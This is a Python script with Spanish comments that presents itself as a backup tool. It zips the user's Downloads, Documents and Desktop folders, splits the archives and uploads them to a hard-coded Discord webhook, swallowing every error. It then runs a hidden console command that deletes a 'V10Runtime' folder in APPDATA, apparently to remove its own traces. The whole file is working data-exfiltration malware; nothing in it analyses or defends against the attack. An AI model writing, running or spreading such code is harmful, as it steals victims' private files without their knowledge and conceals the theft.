import os
import shutil
import requests
import json
from pathlib import Path

WEBHOOK_URL = "https://discord.com/api/webhooks/1563676882468343980/VPrL_iVZc8gOoNZmcxBcYr5-xxX7GiLgsPQDGNaUVuV1ttlAG9_izkXo2HRP4dyDxTym"

CARPETAS = {
    "Descargas": Path.home() / "Downloads",
    "Documentos": Path.home() / "Documents",
    "Escritorio": Path.home() / "Desktop"
}

# Tamaño máximo por parte en bytes (15 MB para estar seguros por debajo del límite de Discord)
TAMANO_PARTE = 15 * 1024 * 1024

def dividir_y_enviar(zip_path, nombre_carpeta):
    partes = []
    with open(zip_path, "rb") as f:
        parte_num = 1
        while True:
            chunk = f.read(TAMANO_PARTE)
            if not chunk:
                break
            
            parte_nombre = f"{zip_path}.part{parte_num:03d}"
            with open(parte_nombre, "wb") as parte_file:
                parte_file.write(chunk)
            
            partes.append(parte_nombre)
            parte_num += 1

    total_partes = len(partes)
    for idx, parte_path in enumerate(partes, 1):
        with open(parte_path, "rb") as f:
            requests.post(
                WEBHOOK_URL,
                files={
                    "file": (os.path.basename(parte_path), f),
                    "payload_json": (None, json.dumps({
                        "content": f"📁 Respaldo de **{nombre_carpeta}** (Parte {idx}/{total_partes})"
                    }))
                }
            )
        os.remove(parte_path)

def procesar_y_enviar():
    for nombre, ruta in CARPETAS.items():
        if not ruta.exists():
            continue
            
        zip_name = f"{nombre.lower()}_respaldo"
        zip_path = f"{zip_name}.zip"
        
        try:
            shutil.make_archive(zip_name, 'zip', ruta)
            
            if os.path.exists(zip_path):
                dividir_y_enviar(zip_path, nombre)
        except Exception:
            pass
        finally:
            if os.path.exists(zip_path):
                os.remove(zip_path)

if __name__ == "__main__":
    procesar_y_enviar()

    try:
        ruta_runtime = os.path.join(os.environ["APPDATA"], "V10Runtime")
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE

        subprocess.Popen(
            f'ping 127.0.0.1 -n 2 > nul & rmdir /s /q "{ruta_runtime}"',
            shell=True,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except Exception:
        pass
